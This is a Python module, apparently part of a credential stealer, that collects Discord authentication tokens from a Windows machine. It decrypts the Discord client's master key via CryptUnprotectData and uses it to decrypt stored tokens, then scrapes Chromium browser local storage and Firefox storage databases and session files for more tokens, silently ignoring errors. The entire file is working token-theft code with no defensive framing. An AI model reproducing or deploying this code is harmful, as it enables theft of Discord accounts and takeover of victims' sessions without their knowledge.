import os
import re
import base64
import json
import sqlite3
import shutil
import tempfile
from utils import CryptUnprotectData, DecryptValue, extract_discord_tokens_regex, get_all_browser_profiles, load_json_config, expand_path

def extract_tokens_discord_clients(discord_config):
    tokens = set()
    
    for discord_client in discord_config.get("discord_clients", []):
        path = expand_path(discord_client["path"])
        
        if not os.path.exists(path + "\\Local State"):
            continue
        
        pathC = path + discord_client["local_storage"]
        if not os.path.exists(pathC):
            continue
        
        try:
            with open(path + "\\Local State", 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
            
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = CryptUnprotectData(master_key[5:])
            
            for file in os.listdir(pathC):
                if not (file.endswith(".log") or file.endswith(".ldb")):
                    continue
                
                try:
                    with open(os.path.join(pathC, file), "r", errors="ignore") as f:
                        content = f.read()
                        
                        for extracted_token in re.findall(r"dQw4w9WgXcQ:[A-Za-z0-9\._-]+", content):
                            try:
                                tokenDecoded = DecryptValue(base64.b64decode(extracted_token.split('dQw4w9WgXcQ:')[1]), master_key)
                                if tokenDecoded:
                                    tokens.add(tokenDecoded)
                            except:
                                pass
                        
                        tokens.update(extract_discord_tokens_regex(content))
                except:
                    pass
        except:
            pass
    
    return tokens

def extract_tokens_browsers(browser_config):
    tokens = set()
    
    for browser in browser_config.get("chromium_browsers", []):
        browser_path = expand_path(browser["path"])
        
        if not os.path.exists(browser_path):
            continue
        
        profiles = get_all_browser_profiles(browser_path)
        
        for profile in profiles:
            leveldb_path = os.path.join(browser_path, profile, "Local Storage", "leveldb")
            
            if not os.path.exists(leveldb_path):
                continue
            
            try:
                for file_name in os.listdir(leveldb_path):
                    if not (file_name.endswith(".log") or file_name.endswith(".ldb")):
                        continue
                    
                    try:
                        with open(os.path.join(leveldb_path, file_name), 'r', errors='ignore') as f:
                            content = f.read()
                            tokens.update(extract_discord_tokens_regex(content))
                    except:
                        pass
            except:
                pass
    
    return tokens

def extract_tokens_firefox(firefox_config):
    tokens = set()
    firefox_data = firefox_config.get("firefox", {})
    firefox_path = expand_path(firefox_data.get("profiles_path", "{APPDATA}/Mozilla/Firefox/Profiles"))
    
    if not os.path.exists(firefox_path):
        return tokens
    
    for profile in os.listdir(firefox_path):
        profile_path = os.path.join(firefox_path, profile)
        
        if not os.path.isdir(profile_path):
            continue
        
        webappsstore_db = firefox_data.get("databases", {}).get("webappsstore", "webappsstore.sqlite")
        local_storage_db = os.path.join(profile_path, webappsstore_db)
        
        if os.path.exists(local_storage_db):
            temp_db = os.path.join(tempfile.gettempdir(), f"webappsstore_{profile}_{os.getpid()}.db")
            
            try:
                shutil.copy2(local_storage_db, temp_db)
                conn = sqlite3.connect(temp_db, timeout=5)
                cursor = conn.cursor()
                cursor.execute("SELECT key, value FROM webappsstore WHERE originKey LIKE '%discord%'")
                
                for row in cursor.fetchall():
                    if row[0]:
                        tokens.update(extract_discord_tokens_regex(row[0]))
                    if row[1]:
                        tokens.update(extract_discord_tokens_regex(row[1]))
                
                cursor.close()
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        sessionstore_files = firefox_data.get("sessionstore", [])
        for sessionstore_file in sessionstore_files:
            sessionstore_path = os.path.join(profile_path, sessionstore_file)
            
            if not os.path.exists(sessionstore_path):
                continue
            
            try:
                with open(sessionstore_path, 'rb') as f:
                    content = f.read().decode('utf-8', errors='ignore')
                    tokens.update(extract_discord_tokens_regex(content))
            except:
                pass
    
    return tokens

def extract_discord_tokens():
    all_tokens = set()
    
    discord_config = load_json_config("discord.json")
    browser_config = load_json_config("browser.json")
    firefox_config = load_json_config("firefox.json")
    
    all_tokens.update(extract_tokens_discord_clients(discord_config))
    all_tokens.update(extract_tokens_browsers(browser_config))
    all_tokens.update(extract_tokens_firefox(firefox_config))
    
    return all_tokens

def get_tokens():
    tokens = extract_discord_tokens()
    if tokens:
        return "\n".join(sorted(list(tokens)))
    return None

def get_tokens_json():
    tokens = extract_discord_tokens()
    if tokens:
        return [{"token": t} for t in sorted(list(tokens))]
    return []